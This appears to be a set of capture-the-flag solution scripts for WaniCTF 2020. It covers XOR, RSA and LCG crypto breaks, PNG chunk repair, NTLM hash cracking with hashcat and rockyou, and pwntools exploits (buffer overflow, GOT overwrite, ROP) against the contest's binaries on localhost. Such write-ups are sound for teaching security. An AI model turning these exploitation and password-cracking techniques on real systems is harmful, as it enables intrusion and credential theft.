# crypto

## veni_vidi

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/veni_vidi

ROT13

## exclusive

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/exclusive

```python
#!/usr/bin/env python3
def encrypt(s: str, t: str) -> str:
    return "".join([chr(ord(ss) ^ ord(tt)) for ss, tt in zip(s, t)])


ct = open("output.txt").readline().strip()
key = encrypt("FLA", ct[:3]) * 19
flag = encrypt(ct, key)
print(f"{flag=}")
```

## basic_rsa

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/basic_rsa

```python
#!/usr/bin/env python3
from pwn import context, log, remote
io = remote("::1", 50000)


def read_num(var: str) -> int:
    io.recvuntil(f"{var} = ".encode())
    return int(io.recvline(drop=True))


def answer(ans: int) -> None:
    log.info(f"{ans = }")
    io.sendlineafter(b" > ", str(ans).encode())


# ----------------------------------------
p = read_num("p")
q = read_num("q")
n = p * q
answer(n)
# ----------------------------------------
m = read_num("m")
e = read_num("e")
n = read_num("n")
c = pow(m, e, n)
answer(c)
# ----------------------------------------
p = read_num("p")
q = read_num("q")
e = read_num("e")
c = read_num("c")
n = p * q
phy = (p - 1) * (q - 1)
d = pow(e, -1, phy)
m = pow(c, d, n)
answer(m)
# ----------------------------------------
io.recvuntil(b"FLAG{")
io.success("FLAG{%s", io.recvuntil(b"}").decode())
io.interactive()
```

## lcg

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/lcg

```zsh
#!/usr/bin/env python3
import math
from pwn import log, remote
io = remote("::1", 50001)


def read_num() -> int:
    io.recvuntil(b"> ")
    io.sendline(b"1")
    i = int(io.recvline(drop=True))
    log.info("read_num(): %d", i)
    return i


x0 = read_num()
x1 = read_num()
x2 = read_num()
x3 = read_num()
x4 = read_num()
y0 = x1 - x0
y1 = x2 - x1
y2 = x3 - x2
y3 = x4 - x3
m = math.gcd(abs(y3*y1 - y2*y2), abs(y2*y0 - y1*y1))
log.info(f"{m=}")
a = y1 * pow(y0, -1, m)
log.info(f"{a=}")
b = (x1 - a*x0) % m
log.info(f"{b=}")

io.recvuntil(b"> ")
io.sendline(b"2")

for _ in range(10):
    next_val = (a * x4 + b) % m
    log.info(f"{next_val=}")
    log.info("%s", io.recvuntil(b"> "))
    io.sendline(str(next_val).encode())
    x4 = next_val

io.timeout = 1
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}"))
io.stream()
```

## l0g0n

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/l0g0n

```zsh
yes 0000000000000000|nc ::1 50002|grep FLAG
```

# forensics

## logged_flag

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/forensics/logged_flag

```zsh
$ extract -sf secret.jpg
```
## chunk_eater

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/forensics/chunk_eater
- https://ja.wikipedia.org/wiki/Portable_Network_Graphics
- https://www.setsuki.com/hsp/ext/png.htm

```zsh
$ strings -tx eaten.png|grep WANI
      c WANI
    3ab PWANIx^
  10008 WANI
  20008 WANI
  22dc1 WANI

$ xxd -l16 eaten.png
00000000: 8950 4e47 0d0a 1a0a 0000 000d 5741 4e49  .PNG........WANI

$ xxd -l16 -s0x3a0 eaten.png
000003a0: 7222 3f3e b86c af91 0000 fc50 5741 4e49  r"?>.l.....PWANI

xxd -l16 -s0x10000 eaten.png
00010000: 77f7 6320 0000 fff4 5741 4e49 0a42 3417  w.c ....WANI.B4.

xxd -l16 -s0x20000 eaten.png
00020000: 4177 9914 0000 2dad 5741 4e49 c58b e5b2  Aw....-.WANI....

xxd -l16 -s0x22dc0 eaten.png
00022dc0: 0057 414e 49ae 4260 82                   .WANI.B`.

$ hexer eaten.png

$ diff <(xxd file/eaten.png) <(xxd eaten.png)
1c1
< 00000000: 8950 4e47 0d0a 1a0a 0000 000d 5741 4e49  .PNG........WANI
---
> 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
59c59
< 000003a0: 7222 3f3e b86c af91 0000 fc50 5741 4e49  r"?>.l.....PWANI
---
> 000003a0: 7222 3f3e b86c af91 0000 fc50 4944 4154  r"?>.l.....PIDAT
4097c4097
< 00010000: 77f7 6320 0000 fff4 5741 4e49 0a42 3417  w.c ....WANI.B4.
---
> 00010000: 77f7 6320 0000 fff4 4944 4154 0a42 3417  w.c ....IDAT.B4.
8193c8193
< 00020000: 4177 9914 0000 2dad 5741 4e49 c58b e5b2  Aw....-.WANI....
---
> 00020000: 4177 9914 0000 2dad 4944 4154 c58b e5b2  Aw....-.IDAT....
8925c8925
< 00022dc0: 0057 414e 49ae 4260 82                   .WANI.B`.
---
> 00022dc0: 0049 454e 44ae 4260 82                   .IEND.B`.

$ file eaten.png
eaten.png: PNG image data, 1136 x 1232, 8-bit/color RGBA, non-interlaced

$ pngcheck -v eaten.png
File: eaten.png (142793 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1136 x 1232 image, 32-bit RGB+alpha, non-interlaced
  chunk sRGB at offset 0x00025, length 1
    rendering intent = perceptual
  chunk gAMA at offset 0x00032, length 4: 0.45455
  chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels/meter (96 dpi)
  chunk tEXt at offset 0x00057, length 25, keyword: Software
  chunk iTXt at offset 0x0007c, length 804, keyword: XML:com.adobe.xmp
    uncompressed, no language tag
    no translated keyword, 783 bytes of UTF-8 text
  chunk IDAT at offset 0x003ac, length 64592
    zlib: deflated, 32K window, fast compression
  chunk IDAT at offset 0x10008, length 65524
  chunk IDAT at offset 0x20008, length 11693
  chunk IEND at offset 0x22dc1, length 0
No errors detected in eaten.png (10 chunks, 97.5% compression).
```

## zero_size_png

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/forensics/zero_size_png
- https://www.setsuki.com/hsp/ext/chunk/IHDR.htm

```zsh
$ pngcheck -v dyson.png
File: dyson.png (650046 bytes)
  chunk IHDR at offset 0x0000c, length 13:  invalid image dimensions (0x0)
ERRORS DETECTED in dyson.png

$ xxd -l0x21 dyson.png
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0000 0000 0000 0806 0000 00b5 5951  ..............YQ
00000020: a1                                       .
```

```zsh
$ ./solver.py
w=00000257, h=0000030d

$ xxd -l0x21 dyson.png
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0257 0000 030d 0806 0000 00b5 5951  ...W..........YQ
00000020: a1

$ pngcheck -v dyson.png
File: dyson.png (650046 bytes)
  chunk IHDR at offset 0x0000c, length 13
    599 x 781 image, 32-bit RGB+alpha, non-interlaced
  chunk gAMA at offset 0x00025, length 4: 0.45455
  chunk pHYs at offset 0x00035, length 9: 3780x3780 pixels/meter (96 dpi)
  chunk IDAT at offset 0x0004a, length 65458
    zlib: deflated, 32K window, fast compression
  chunk IDAT at offset 0x10008, length 65524
  chunk IDAT at offset 0x20008, length 65524
  chunk IDAT at offset 0x30008, length 65524
  chunk IDAT at offset 0x40008, length 65524
  chunk IDAT at offset 0x50008, length 65524
  chunk IDAT at offset 0x60008, length 65524
  chunk IDAT at offset 0x70008, length 65524
  chunk IDAT at offset 0x80008, length 65524
  chunk IDAT at offset 0x90008, length 60194
  chunk IEND at offset 0x9eb36, length 0
No errors detected in dyson.png (14 chunks, 65.3% compression).
```

### solver.py

```zsh
#!/usr/bin/env python3
from binascii import crc32

for w in range(1, 0xfff):
    for h in range(1, 0xfff):
        data = (b"IHDR" + w.to_bytes(4, "big") + h.to_bytes(4, "big") +
                b"\x08\x06\x00\x00\x00")
        if (crc32(data) & 0xffffffff) == 0xb55951a1:
            print(f"{w=:08x}, {h=:08x}")
            exit()
```

## ALLIGATOR_03

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/forensics/ALLIGATOR_03

```
$ cat hash.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
ALLIGATOR:1003:aad3b435b51404eeaad3b435b51404ee:5e7a211fee4f7249f9db23e4a07d7590:::

$ hashcat hash.txt ~/CTF/rockyou.txt -m 1000
 (snip)
31d6cfe0d16ae931b73c59d7e0c089c0:
fc525c9683e8fe067095ba2ddc971889:Passw0rd!
5e7a211fee4f7249f9db23e4a07d7590:ilovewani
 (snip)
```

```zsh
$ 7z x -p"ilovewani" wani_secret.zip

$ cat wani_secret/flag.txt|grep FLAG
```

# pwn

## 01-netcat

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/01-netcat

```python
#!/usr/bin/env python3
from pwn import log, remote
io = remote("::1", 9001)
io.recvuntil(b"congratulation!\n")
io.sendline(b"cat flag.txt")
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
io.close()
```

## 02-var-rewrite

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/02-var-rewrite

```python
#!/usr/bin/env python3
from pwn import context, log, remote
context.log_level = "debug"
io = remote("::1", 9002)
io.sendlineafter(b"What's your name?: ", b"Y"*(0x16-0xc)+b"WANI")
io.sendlineafter(b"Congratulation!", b"cat flag.txt")
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
io.close()
```

## 03-binsh-address

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/03-binsh-address

```python
#!/usr/bin/env python3
from pwn import ELF, context, log, remote
exe = context.binary = ELF("./pwn03")
io = remote("::1", 9003)
io.recvuntil(b" is 0x")
head_addr = int(io.recvuntil(b".\n", drop=True), 16)
binsh_addr = head_addr + exe.sym.binsh - exe.sym.str_head
io.sendlineafter(b"hex number: ", hex(binsh_addr).encode())
io.sendlineafter(b"Congratulation!\n", b"cat flag.txt")
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}"))
io.close()
```

## 04-got-rewriter

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/04-got-rewriter

```python
#!/usr/bin/env python3
from pwn import ELF, args, context, log, process, remote
# context.log_level = "debug"
exe = context.binary = ELF("./pwn04", checksec=False)
if args.REMOTE:
    io = remote("::1", 9004)
else:
    io = process(exe.path)
io.recvuntil(b"win = 0x")
win_addr = int(io.recvline(drop=True), 16)
log.info("win():\t0x%016x", win_addr)
printf_got = exe.got.printf
log.info("printf@got:\t0x%016x", printf_got)
io.sendlineafter(b"0x6010b0): ", hex(printf_got).encode())
io.sendlineafter(b"rewrite value: ", hex(win_addr).encode())
io.interactive()
```

## 05-ret-rewrite

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/05-ret-rewrite

```python
#!/usr/bin/env python3
from pwn import ELF, ROP, args, context, log, flat, remote, process
# context.log_level = "debug"
exe = context.binary = ELF("./pwn05", checksec=False)
if args.REMOTE:
    io = remote("::1", 9005)
else:
    io = process(exe.path)
rop = ROP(exe)
rop.raw(rop.ret)
rop.win()
log.info("rop:\n%s", rop.dump())
io.sendlineafter(b"What's your name?: ", flat(b"A"*14, b"B"*8, rop))
io.sendlineafter(b"congratulation!", b"cat flag.txt")
io.interactive()
```
